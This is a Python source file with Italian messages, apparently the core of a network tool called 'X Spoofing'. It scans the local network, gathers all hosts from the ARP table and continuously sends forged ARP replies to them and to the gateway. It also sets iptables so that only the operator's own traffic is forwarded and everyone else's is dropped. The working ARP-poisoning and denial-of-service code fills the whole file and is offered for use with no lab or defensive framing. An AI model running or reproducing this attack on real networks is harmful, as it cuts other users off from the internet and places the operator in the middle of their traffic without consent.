"""Core network operations (based on net_kill / ARP poison flow)."""

from __future__ import annotations

import os
import subprocess
import sys
import time
from typing import Callable, List, Tuple

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp

StatusCallback = Callable[[str], None]


def _log(msg: str, on_status: StatusCallback | None = None) -> None:
    if on_status:
        on_status(msg)
    else:
        print(msg)


def enable_ip_forward(enable: bool) -> None:
    val = "1" if enable else "0"
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(val)


def get_my_ip(interface: str) -> str:
    out = subprocess.check_output(
        ["ip", "-4", "addr", "show", interface]
    ).decode()
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    raise RuntimeError("Impossibile trovare IP per " + interface)


def get_network(ip: str, prefix: int = 24) -> str:
    parts = ip.split(".")
    return ".".join(parts[:3]) + ".0/" + str(prefix)


def _mac_from_arp_table(ip: str) -> str | None:
    try:
        with open("/proc/net/arp") as f:
            lines = f.readlines()[1:]
    except OSError:
        return None
    for line in lines:
        fields = line.split()
        if len(fields) < 4:
            continue
        if fields[0] == ip and fields[3] not in ("00:00:00:00:00:00", "<incomplete>"):
            return fields[3]
    return None


def _mac_from_ip_neigh(ip: str, interface: str) -> str | None:
    try:
        out = subprocess.check_output(
            ["ip", "neigh", "show", ip, "dev", interface],
            stderr=subprocess.DEVNULL,
        ).decode()
    except (FileNotFoundError, subprocess.CalledProcessError):
        return None
    for token in out.split():
        if token.count(":") == 5 and token != "00:00:00:00:00:00":
            return token.lower()
    return None


def resolve_mac(ip: str, interface: str) -> str | None:
    """MAC di un host sulla LAN: cache ARP, ping, poi richiesta ARP sull'interfaccia."""
    mac = _mac_from_arp_table(ip) or _mac_from_ip_neigh(ip, interface)
    if mac:
        return mac

    subprocess.call(
        ["ping", "-c", "2", "-W", "1", "-I", interface, ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    mac = _mac_from_arp_table(ip) or _mac_from_ip_neigh(ip, interface)
    if mac:
        return mac

    conf.iface = interface
    try:
        answered, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=interface,
            timeout=3,
            retry=2,
            verbose=False,
        )
    except Exception:
        return None
    if not answered:
        return None
    return answered[0][1].hwsrc


def arp_spoof(
    target_ip: str, target_mac: str, spoof_ip: str, interface: str
) -> None:
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )
    sendp(pkt, iface=interface, verbose=False)


def list_ipv4_interfaces() -> List[str]:
    try:
        out = subprocess.check_output(["ip", "-o", "-4", "addr", "show"]).decode()
    except (FileNotFoundError, subprocess.CalledProcessError):
        return []
    names: List[str] = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        name = parts[1]
        if name == "lo" or name in names:
            continue
        names.append(name)
    return names


def scan_network(interface: str, on_status: StatusCallback | None = None) -> str:
    my_ip = get_my_ip(interface)
    network = get_network(my_ip)
    _log(f"[*] Scansione rete {network} …", on_status)
    subprocess.call(
        ["nmap", "-sn", "-n", network],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return network


def collect_targets(
    interface: str, gateway_ip: str, on_status: StatusCallback | None = None
) -> Tuple[str, List[Tuple[str, str]]]:
    my_ip = get_my_ip(interface)
    network = scan_network(interface, on_status)

    with open("/proc/net/arp") as f:
        lines = f.readlines()[1:]

    targets: List[Tuple[str, str]] = []
    for line in lines:
        fields = line.split()
        if len(fields) < 4:
            continue
        ip, mac = fields[0], fields[3]
        if mac == "00:00:00:00:00:00":
            continue
        if ip in (my_ip, gateway_ip):
            continue
        targets.append((ip, mac))

    return network, targets


def restore_arp(
    targets: List[Tuple[str, str]],
    gateway_ip: str,
    gateway_mac: str,
    interface: str,
) -> None:
    for ip, mac in targets:
        pkt = Ether(dst=mac) / ARP(
            op=2,
            pdst=ip,
            hwdst=mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
        )
        sendp(pkt, iface=interface, verbose=False)
    subprocess.call(["iptables", "-F", "FORWARD"])
    enable_ip_forward(False)


def run_x_spoofing(
    interface: str,
    gateway_ip: str,
    on_status: StatusCallback | None = None,
    stop_check: Callable[[], bool] | None = None,
) -> None:
    """X Spoofing: ARP poison + iptables (solo il tuo MAC inoltra)."""
    conf.verb = 0
    my_mac = get_if_hwaddr(interface)
    _log(f"[*] Interfaccia: {interface}  MAC: {my_mac}", on_status)
    _log(f"[*] Gateway: {gateway_ip}", on_status)

    network, targets = collect_targets(interface, gateway_ip, on_status)
    if not targets:
        _log("[-] Nessun target trovato. Prova a pingare la rete prima.", on_status)
        return

    _log(f"[+] Target trovati: {len(targets)} su {network}", on_status)

    gateway_mac = resolve_mac(gateway_ip, interface)
    if not gateway_mac:
        raise RuntimeError(
            "MAC del gateway non trovato. "
            "Controlla l'IP del router (opzione 3) e che sia sulla stessa interfaccia."
        )
    _log(f"[+] Gateway MAC: {gateway_mac}", on_status)

    enable_ip_forward(True)
    subprocess.call(["iptables", "-F", "FORWARD"])
    subprocess.call(
        [
            "iptables",
            "-A",
            "FORWARD",
            "-m",
            "mac",
            "--mac-source",
            my_mac,
            "-j",
            "ACCEPT",
        ]
    )
    subprocess.call(["iptables", "-A", "FORWARD", "-j", "DROP"])

    _log("[*] X Spoofing attivo — Ctrl+C per fermare.", on_status)

    try:
        while True:
            if stop_check and stop_check():
                break
            for ip, mac in targets:
                arp_spoof(ip, mac, gateway_ip, interface)
                arp_spoof(gateway_ip, gateway_mac, ip, interface)
            time.sleep(1.5)
    except KeyboardInterrupt:
        pass
    finally:
        _log("[*] Ripristino ARP e iptables…", on_status)
        restore_arp(targets, gateway_ip, gateway_mac, interface)
        _log("[+] Ripristinato.", on_status)


def list_arp_hosts(
    interface: str, on_status: StatusCallback | None = None
) -> Tuple[str, List[Tuple[str, str]]]:
    my_ip = get_my_ip(interface)
    network = scan_network(interface, on_status)
    hosts: List[Tuple[str, str]] = []
    with open("/proc/net/arp") as f:
        for line in f.readlines()[1:]:
            fields = line.split()
            if len(fields) < 4:
                continue
            ip, mac = fields[0], fields[3]
            if mac == "00:00:00:00:00:00" or ip == my_ip:
                continue
            hosts.append((ip, mac))
    return network, hosts


def require_root() -> bool:
    """True se hai i permessi necessari su Linux."""
    if sys.platform == "linux" and os.geteuid() != 0:
        return False
    return True
